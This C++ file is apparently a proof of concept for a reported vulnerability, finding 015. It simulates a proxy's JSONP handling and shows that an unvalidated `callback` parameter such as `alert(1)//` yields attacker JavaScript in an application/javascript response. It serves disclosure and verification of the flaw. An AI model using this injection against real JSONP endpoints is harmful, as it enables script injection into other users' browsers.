// PoC for finding 015: src/proxy/requestsession.cpp:535 / :541.
//
// When a route enables autoCrossOrigin/JSONP, RequestSession::tryApplyJsonp()
// reads the `callback` query parameter, percent-decodes it, and stores it
// in `jsonpCallback` (line 615-625 in the unpatched source). The only
// rejection branch is "empty after decode". Any other byte sequence -- not
// even ASCII, not even a valid JS identifier -- is accepted.
//
// makeJsonpStart() then builds the response prefix at line 540-541:
//     QByteArray out = "/**/" + jsonpCallback + "(";
//
// doResponseUpdate() emits this with Content-Type: application/javascript.
// A callback such as "alert(1)//" produces a response whose body begins
// with executable attacker JavaScript.

#include <cstdio>
#include <string>

// Mirrors parsePercentEncoding for ASCII-printable input -- the actual
// implementation reads %XX hex pairs. We don't need percent-encoding for
// this PoC because "alert(1)//" already passes through verbatim, but we
// keep the call for fidelity with the source.
static std::string parsePercentEncoding(const std::string &in) {
    std::string out;
    for (size_t i = 0; i < in.size(); ++i) {
        if (in[i] == '%' && i + 2 < in.size()) {
            int hi = 0, lo = 0;
            auto hex = [](char c) {
                if (c >= '0' && c <= '9') return c - '0';
                if (c >= 'a' && c <= 'f') return 10 + c - 'a';
                if (c >= 'A' && c <= 'F') return 10 + c - 'A';
                return -1;
            };
            hi = hex(in[i + 1]);
            lo = hex(in[i + 2]);
            if (hi >= 0 && lo >= 0) {
                out += char((hi << 4) | lo);
                i += 2;
                continue;
            }
        }
        out += in[i];
    }
    return out;
}

// Mirrors tryApplyJsonp() unpatched: empty callback rejected, anything else
// is accepted as-is. (See src/proxy/requestsession.cpp:615-625.)
static bool acceptCallback(const std::string &raw, std::string *callbackOut,
                           std::string *errorMessage) {
    std::string callback = parsePercentEncoding(raw);
    if (callback.empty()) {
        *errorMessage = "Invalid callback parameter.";
        return false;
    }
    *callbackOut = callback;
    return true;
}

// Mirrors makeJsonpStart() unpatched at src/proxy/requestsession.cpp:540-541:
//   QByteArray out = "/**/" + jsonpCallback + "(";
static std::string makeJsonpStart(const std::string &callback) {
    return std::string("/**/") + callback + "(";
}

int main() {
    // Attacker hits a JSONP-enabled route with this query string:
    //     ?callback=alert(1)//
    // The "//" at the end comments out the trailing "(" the wrapper appends,
    // so the resulting JS is syntactically valid: "/**/alert(1)//("
    const std::string rawCallback = "alert(1)//";

    std::string callback;
    std::string err;
    if (!acceptCallback(rawCallback, &callback, &err)) {
        std::printf("Callback rejected: %s\n", err.c_str());
        return 2;
    }

    std::string body = makeJsonpStart(callback);
    body += "\"hello world\"";  // simulates makeJsonpBody output
    body += ");\n";              // makeJsonpEnd

    std::string wire =
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: application/javascript\r\n"
        "Content-Length: " + std::to_string(body.size()) + "\r\n"
        "\r\n" + body;

    std::printf("=== Request ===\nGET /?callback=%s HTTP/1.1\n\n", rawCallback.c_str());
    std::printf("=== Response ===\n%s\n", wire.c_str());

    const std::string prefix = "/**/";
    bool injected = body.find("alert(1)//") == prefix.size();
    bool js_executes = body.compare(0, 14, "/**/alert(1)//") == 0;

    if (injected && js_executes) {
        std::puts("RESULT: vulnerable. The callback parameter was percent-decoded and");
        std::puts("        emitted verbatim into an application/javascript response,");
        std::puts("        producing a body that begins with attacker JavaScript:");
        std::puts("            /**/alert(1)//(\"hello world\");");
        std::puts("        The trailing // comments out the appended '('.");
        return 0;
    }

    std::puts("RESULT: did not reproduce");
    return 1;
}
